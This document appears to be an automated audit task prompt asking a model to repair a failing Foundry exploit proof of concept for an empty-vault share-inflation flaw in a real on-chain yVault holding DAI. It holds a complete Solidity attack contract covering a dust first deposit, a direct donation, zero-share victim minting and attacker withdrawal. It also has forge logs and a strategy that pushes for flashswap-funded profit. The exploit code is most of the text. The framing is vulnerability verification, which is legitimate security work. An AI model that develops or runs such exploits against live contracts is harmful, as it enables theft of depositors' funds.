You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Empty-vault inflation attack can steal later deposits via zero-share minting
- claim: Share issuance uses the pre-deposit ratio `shares = _amount * totalSupply / _pool` without any minimum-share check, while `balance()` includes underlying that reaches the vault outside `deposit()` accounting. An attacker can seed the vault with a dust first deposit, then donate underlying directly so `_pool` becomes very large relative to `totalSupply`, causing later deposits to mint zero or negligible shares.
- impact: Victim deposits can be accepted while minting no meaningful yShares, effectively donating their assets to incumbent shareholders. A dust first depositor can then redeem nearly the entire vault balance, including later users' deposits.
- exploit_paths: ["Attacker makes the first deposit with a dust amount and receives the initial shares 1:1.", "Attacker transfers a large amount of underlying directly to the vault, inflating `balance()` without minting new shares.", "A victim calls `deposit()`; because `_pool` is now huge, `(_amount * totalSupply) / _pool` rounds down to zero or dust.", "The attacker later withdraws their shares and captures almost all underlying, including the victim's deposit."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IYVault {
    function token() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balance() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

contract VictimDepositor {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function depositAll(address vaultAddress) external {
        require(msg.sender == owner, "only owner");

        IYVault vault = IYVault(vaultAddress);
        IERC20 token = IERC20(vault.token());
        uint256 amount = token.balanceOf(address(this));
        if (amount == 0) {
            return;
        }

        _safeApprove(token, vaultAddress, 0);
        _safeApprove(token, vaultAddress, amount);

        // The victim path must be an actual vault deposit().
        vault.deposit(amount);
    }

    function sweep(address tokenAddress, address to) external {
        require(msg.sender == owner, "only owner");

        IERC20 token = IERC20(tokenAddress);
        uint256 amount = token.balanceOf(address(this));
        if (amount != 0) {
            _safeTransfer(token, to, amount);
        }
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

contract FlawVerifier {
    IYVault internal constant VAULT = IYVault(0xACd43E627e64355f1861cEC6d3a6688B31a6F952);

    VictimDepositor public immutable victim;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    constructor() {
        victim = new VictimDepositor();
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        IERC20 token = IERC20(VAULT.token());
        _profitToken = address(token);

        uint256 attackerStartingBalance = token.balanceOf(address(this));
        uint256 victimStartingBalance = token.balanceOf(address(victim));

        // Path 1 must remain intact: the attacker needs to be the first depositor into an empty vault.
        if (VAULT.totalSupply() != 0) {
            _profitAmount = 0;
            return;
        }

        // This attempt prefers direct execution with already-held balances only.
        // If either side lacks real pre-existing underlying at the fork, this verifier does not synthesize it.
        if (attackerStartingBalance <= 1 || victimStartingBalance == 0) {
            _profitAmount = 0;
            return;
        }

        uint256 attackerSeed = 1;
        uint256 attackerDonation = attackerStartingBalance - attackerSeed;

        _safeApprove(token, address(VAULT), 0);
        _safeApprove(token, address(VAULT), attackerSeed);

        // Path 1: attacker makes the first dust deposit and receives the initial shares 1:1.
        VAULT.deposit(attackerSeed);

        uint256 attackerShares = VAULT.balanceOf(address(this));
        if (attackerShares != attackerSeed) {
            _profitAmount = 0;
            return;
        }

        // Path 2: attacker transfers underlying directly to the vault, inflating balance() without minting shares.
        _safeTransfer(token, address(VAULT), attackerDonation);

        // Path 3 is the vulnerable share issuance in deposit(uint _amount):
        //   uint _pool = balance();
        //   shares = (_amount * totalSupply) / _pool;
        // After the attacker donation, _pool is artificially huge while totalSupply stays tiny.
        uint256 _pool = VAULT.balance();
        uint256 totalSupply = VAULT.totalSupply();
        uint256 projectedVictimShares = 0;
        if (_pool != 0) {
            projectedVictimShares = (victimStartingBalance * totalSupply) / _pool;
        }

        // Keep the exploit path strict: the victim deposit() must round down to zero shares.
        if (projectedVictimShares != 0) {
            _profitAmount = 0;
            return;
        }

        uint256 victimSharesBefore = VAULT.balanceOf(address(victim));

        // Path 3 continued: victim calls deposit() after the donation.
        victim.depositAll(address(VAULT));

        uint256 victimSharesAfter = VAULT.balanceOf(address(victim));
        uint256 victimMintedShares = victimSharesAfter - victimSharesBefore;
        if (victimMintedShares != 0) {
            _profitAmount = 0;
            return;
        }

        // Path 4: attacker withdraws their shares and captures nearly the entire vault balance,
        // including the victim's later deposit that minted zero shares.
        VAULT.withdraw(attackerShares);

        uint256 attackerEndingBalance = token.balanceOf(address(this));
        if (attackerEndingBalance > attackerStartingBalance) {
            _profitAmount = attackerEndingBalance - attackerStartingBalance;
        } else {
            _profitAmount = 0;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.16s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 96809)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x6B175474E89094C44Da98b954EedeAC495271d0F
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 7904

Traces:
  [96809] FlawVerifierTest::testExploit()
    ├─ [2293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [61380] FlawVerifier::executeOnOpportunity()
    │   ├─ [2513] 0xACd43E627e64355f1861cEC6d3a6688B31a6F952::token() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(VictimDepositor: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2359] 0xACd43E627e64355f1861cEC6d3a6688B31a6F952::totalSupply() [staticcall]
    │   │   └─ ← [Return] 31494626844158695810766902 [3.149e25]
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6B175474E89094C44Da98b954EedeAC495271d0F)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 11792183 [1.179e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7904)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.35s (292.53ms CPU time)

Ran 1 test suite in 1.43s (1.35s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 96809)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
